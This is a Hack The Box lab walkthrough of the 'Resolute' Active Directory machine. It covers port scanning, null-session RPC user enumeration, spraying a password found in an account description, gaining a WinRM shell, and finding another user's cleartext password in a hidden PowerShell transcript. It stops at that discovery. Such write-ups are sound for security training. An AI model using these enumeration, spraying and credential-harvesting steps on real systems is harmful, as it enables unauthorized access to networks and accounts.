# Hack The Box - Resolute Walkthrough 

The [Resolute](https://app.hackthebox.com/machines/Resolute) machine is a medium Windows Machine with a strong focus on Active Directory exploitation. This box was interesting as it showed how to get high privileges using DnsAdmins permissions.


If you didn’t solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.

## Reconnaissance
In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting.

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address.


### Nmap Scan

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.169             
[sudo] password for darshan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-25 08:47 EST
Nmap scan report for 10.10.10.169
Host is up (0.25s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-25 13:54:46Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=1/25%OT=53%CT=1%CU=43414%PV=Y%DS=2%DC=I%G=Y%TM=65B266B
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%CI=I%II=I%TS=A)SEQ(SP=1
OS:04%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=105%GCD=2%ISR=10C%CI=I%
OS:TS=A)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5
OS:=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=
OS:2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF
OS:=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%
OS:RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W
OS:=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D
OS:FI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h47m00s, deviation: 4h37m08s, median: 7m00s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-01-25T13:55:19
|_  start_date: 2024-01-25T13:48:03
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2024-01-25T05:55:17-08:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.83 seconds
```

### Rustscan

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ rustscan -a 10.10.10.169 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.169:53
Open 10.10.10.169:88
Open 10.10.10.169:135
Open 10.10.10.169:139
Open 10.10.10.169:389
Open 10.10.10.169:445
Open 10.10.10.169:464
Open 10.10.10.169:593
Open 10.10.10.169:636
Open 10.10.10.169:3268
Open 10.10.10.169:3269
Open 10.10.10.169:5985
Open 10.10.10.169:9389
Open 10.10.10.169:47001
Open 10.10.10.169:49664
Open 10.10.10.169:49668
Open 10.10.10.169:49665
Open 10.10.10.169:49666
Open 10.10.10.169:49671
Open 10.10.10.169:49678
Open 10.10.10.169:49679
Open 10.10.10.169:49684
Open 10.10.10.169:49923
Open 10.10.10.169:50073
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49668,49665,49666,49671,49678,49679,49684,49923,50073 10.10.10.169

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-25 08:51 EST
Initiating Ping Scan at 08:51
Scanning 10.10.10.169 [2 ports]
Completed Ping Scan at 08:51, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:51
Completed Parallel DNS resolution of 1 host. at 08:51, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 08:51
Scanning 10.10.10.169 [24 ports]
Discovered open port 135/tcp on 10.10.10.169
Discovered open port 53/tcp on 10.10.10.169
Discovered open port 445/tcp on 10.10.10.169
Discovered open port 139/tcp on 10.10.10.169
Discovered open port 49923/tcp on 10.10.10.169
Discovered open port 3269/tcp on 10.10.10.169
Discovered open port 5985/tcp on 10.10.10.169
Discovered open port 47001/tcp on 10.10.10.169
Discovered open port 389/tcp on 10.10.10.169
Discovered open port 49666/tcp on 10.10.10.169
Discovered open port 49679/tcp on 10.10.10.169
Discovered open port 49671/tcp on 10.10.10.169
Discovered open port 88/tcp on 10.10.10.169
Discovered open port 3268/tcp on 10.10.10.169
Discovered open port 49668/tcp on 10.10.10.169
Discovered open port 49664/tcp on 10.10.10.169
Discovered open port 593/tcp on 10.10.10.169
Discovered open port 49678/tcp on 10.10.10.169
Discovered open port 49684/tcp on 10.10.10.169
Discovered open port 464/tcp on 10.10.10.169
Discovered open port 9389/tcp on 10.10.10.169
Discovered open port 49665/tcp on 10.10.10.169
Discovered open port 636/tcp on 10.10.10.169
Completed Connect Scan at 08:51, 0.52s elapsed (24 total ports)
Nmap scan report for 10.10.10.169
Host is up, received conn-refused (0.26s latency).
Scanned at 2024-01-25 08:51:02 EST for 0s

PORT      STATE  SERVICE          REASON
53/tcp    open   domain           syn-ack
88/tcp    open   kerberos-sec     syn-ack
135/tcp   open   msrpc            syn-ack
139/tcp   open   netbios-ssn      syn-ack
389/tcp   open   ldap             syn-ack
445/tcp   open   microsoft-ds     syn-ack
464/tcp   open   kpasswd5         syn-ack
593/tcp   open   http-rpc-epmap   syn-ack
636/tcp   open   ldapssl          syn-ack
3268/tcp  open   globalcatLDAP    syn-ack
3269/tcp  open   globalcatLDAPssl syn-ack
5985/tcp  open   wsman            syn-ack
9389/tcp  open   adws             syn-ack
47001/tcp open   winrm            syn-ack
49664/tcp open   unknown          syn-ack
49665/tcp open   unknown          syn-ack
49666/tcp open   unknown          syn-ack
49668/tcp open   unknown          syn-ack
49671/tcp open   unknown          syn-ack
49678/tcp open   unknown          syn-ack
49679/tcp open   unknown          syn-ack
49684/tcp open   unknown          syn-ack
49923/tcp open   unknown          syn-ack
50073/tcp closed unknown          conn-refused

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds
```

### Enumerating SMB service (Crackmapexec)

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ crackmapexec smb 10.10.10.169                                            
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ crackmapexec smb 10.10.10.169 --shares
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] Error enumerating shares: SMB SessionError: 0x5b
                                                                                
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ crackmapexec smb 10.10.10.169 -u '' -p ''
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\: STATUS_ACCESS_DENIED

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ crackmapexec smb 10.10.10.169 --shares -u '' -p ''
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\: STATUS_ACCESS_DENIED 
SMB         10.10.10.169    445    RESOLUTE         [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ crackmapexec smb 10.10.10.169 --pass-pol
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] Dumping password info for domain: MEGABANK
SMB         10.10.10.169    445    RESOLUTE         Minimum password length: 7
SMB         10.10.10.169    445    RESOLUTE         Password history length: 24
SMB         10.10.10.169    445    RESOLUTE         Maximum password age: Not Set
SMB         10.10.10.169    445    RESOLUTE         
SMB         10.10.10.169    445    RESOLUTE         Password Complexity Flags: 000000
SMB         10.10.10.169    445    RESOLUTE             Domain Refuse Password Change: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password Store Cleartext: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password Lockout Admins: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password No Clear Change: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password No Anon Change: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password Complex: 0
SMB         10.10.10.169    445    RESOLUTE         
SMB         10.10.10.169    445    RESOLUTE         Minimum password age: 1 day 4 minutes 
SMB         10.10.10.169    445    RESOLUTE         Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.169    445    RESOLUTE         Locked Account Duration: 30 minutes 
SMB         10.10.10.169    445    RESOLUTE         Account Lockout Threshold: None
SMB         10.10.10.169    445    RESOLUTE         Forced Log off Time: Not Set
```

### RPCclient

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ rpcclient 10.10.10.169 -U ''            
Password for [WORKGROUP\]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

The password didnt work for the RPCclient but apparently using -N (Null Authentication) flag worked.

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ rpcclient 10.10.10.169 -U '' -N
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
```

```bash
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Thu, 25 Jan 2024 08:49:10 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last set Time   :      Thu, 25 Jan 2024 09:21:03 EST
        Password can change Time :      Fri, 26 Jan 2024 09:21:03 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000080
        padding1[0..7]...
        logon_hrs[0..21]...
```

```bash
rpcclient $> querydispinfo
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)
```

```bash
rpcclient $> queryuser 0x457
        User Name   :   marko
        Full Name   :   Marko Novak
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Account created. Password set to Welcome123!
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 31 Dec 1969 19:00:00 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Fri, 27 Sep 2019 09:17:15 EDT
        Password can change Time :      Sat, 28 Sep 2019 09:17:15 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x457
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
```

Here, I got the password for the user Marko - `Welcome123!`

### Tried logging in using the credentials `marko:Welcome123!` but it failed.

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ crackmapexec smb 10.10.10.169 -u marko -p 'Welcome123!' 
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
```

Tried logging in using `EvilWinRM` but that didnt work too.

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ evil-winrm -S -i 10.10.10.169 -u marko -p 'Welcome123!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type Errno::ECONNREFUSED happened, message is Connection refused - Connection refused - connect(2) for "10.10.10.169" port 5986 (10.10.10.169:5986)
                                        
Error: Exiting with code 1
```

### Simple script to exact just the user name using `awk`

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ cat rpc-users| awk -F\[ '{print $2}' | awk -F\] '{print $1}'
Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```

So, then, I decided to pass the password amongst the other users obtained through the `rpcclient` using `crackmapexec`

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ crackmapexec smb 10.10.10.169 -u users.txt -p 'Welcome123!' --continue-on-success
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\:Welcome123! STATUS_LOGON_FAILURE
```

### Tried logging in as `melanie` and it worked

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/resolute]
└─$ evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!' 

                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents> whoami
megabank\melanie
```

### User flag

```bash
*Evil-WinRM* PS C:\Users\melanie> cd Desktop
*Evil-WinRM* PS C:\Users\melanie\Desktop> dir

    Directory: C:\Users\melanie\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/25/2024   5:49 AM             34 user.txt

*Evil-WinRM* PS C:\Users\melanie\Desktop> type user.txt
...SNIP...
```

### Looking through hidden files in the `C:\` directory, found this `PSTranscripts` 

```bash
*Evil-WinRM* PS C:\> ls -force

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-        1/25/2024   5:47 AM      402653184 pagefile.sys
```

Found `PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt` inside the `PSTranscripts` directory

```bash
*Evil-WinRM* PS C:\> cd PSTranscripts
*Evil-WinRM* PS C:\PSTranscripts> ls
*Evil-WinRM* PS C:\PSTranscripts> ls -force

    Directory: C:\PSTranscripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203

*Evil-WinRM* PS C:\PSTranscripts> cd 20191203
*Evil-WinRM* PS C:\PSTranscripts\20191203> ls
*Evil-WinRM* PS C:\PSTranscripts\20191203> ls -force

    Directory: C:\PSTranscripts\20191203

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

Couldnt download the file, so i looked into the contents of the file.

```bash
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
```

Found out that there’s a `net use` command trying to map a share into drive `X:` using `ryan’s` password.

```bash
...
